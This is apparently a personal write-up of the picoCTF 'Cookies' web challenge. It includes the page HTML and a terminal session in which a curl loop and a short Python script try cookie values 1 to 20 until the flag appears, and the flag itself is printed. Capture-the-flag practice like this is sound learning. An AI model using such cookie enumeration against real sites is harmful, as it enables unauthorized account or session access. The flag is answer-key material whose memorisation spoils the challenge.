sudo apt install burpsuite

Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:21485/](http://mercury.picoctf.net:21485/)

## Solución 
```
</html><!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>
        
        <!-- Categories: success (green), info (blue), warning (yellow), danger (red) -->
        
        
        <div class="alert alert-success alert-dismissible" role="alert" id="myAlert">
          <button type="button" class="close" data-dismiss="alert" aria-label="Close"><span aria-hidden="true">&times;</span></button>
          <!-- <strong>Title</strong> --> That is a cookie! Not very special though...
            </div>
      
      
      
        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>I love fortune cookies!</b></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
    <script>
    $(document).ready(function(){
        $(".close").click(function(){
            $("myAlert").alert("close");
        });
    });
    </script>
</body>

Siloy-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done
| grep PicoCTF
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
            <p>&copy; PicoCTF</p>
Siloy-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done| grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
Siloy-picoctf@webshell:~$ ^C
Siloy-picoctf@webshell:~$ ^C
Siloy-picoctf@webshell:~$ for i in {1..20}; do curl -s http://mercury.picoctf.net:21485/check -H "Cookie: name=$i"; done| grep -oE "picoCTF{.*?}"
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
Siloy-picoctf@webshell:~$ curl http://mercury.picoctf.net:21485/check 
-H "Cookie: name=$i"; done| grep -oE "picoCTF{.*?}"
-bash: syntax error near unexpected token `done'
Siloy-picoctf@webshell:~$ curl http://mercury.picoctf.net:21485/check -H "Cookie: name=18"; done| grep -oE "picoCTF{.*?}"
-bash: syntax error near unexpected token `done'
Siloy-picoctf@webshell:~$ curl http://mercury.picoctf.net:21485/check -H 'Cookie: name=18'; done| grep -oE "picoCTF{.*?}"
-bash: syntax error near unexpected token `done'
Siloy-picoctf@webshell:~$ curl http://mercury.picoctf.net:21485/check -H 'Cookie: name=18'; done| grep -oE "picoCTF{.*?}"^C
Siloy-picoctf@webshell:~$ curl http://mercury.picoctf.net:21485/check -H 'Cookie: name=18'                               
<!DOCTYPE html>
<html lang="en">

<head>
    <title>Cookies</title>


    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css" rel="stylesheet">

    <link href="https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css" rel="stylesheet">

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

</head>

<body>

    <div class="container">
        <div class="header">
            <nav>
                <ul class="nav nav-pills pull-right">
                    <li role="presentation"><a href="/reset" class="btn btn-link pull-right">Home</a>
                    </li>
                </ul>
            </nav>
            <h3 class="text-muted">Cookies</h3>
        </div>

        <div class="jumbotron">
            <p class="lead"></p>
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}</code></p>
        </div>


        <footer class="footer">
            <p>&copy; PicoCTF</p>
        </footer>

    </div>
</body>

Siloy-picoctf@webshell:~$ 



picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}
```


## otras soluciones:

import requests
import re
url = "http://mercury.picoctf.net:21485/check"

for i in range(20):
        cookies = {'name':'{}'.format(i)}
        #print(cookies)
        r = requests.get(url, cookies=cookies)
        if 'picoCTF' in r.text:
                #print(r.text)
                flag = re.findall('picoCTF{.*?}',r.text)[0]
                print(flag)
![[Pasted image 20250326130358.png]]
![[Pasted image 20250326130420.png]]
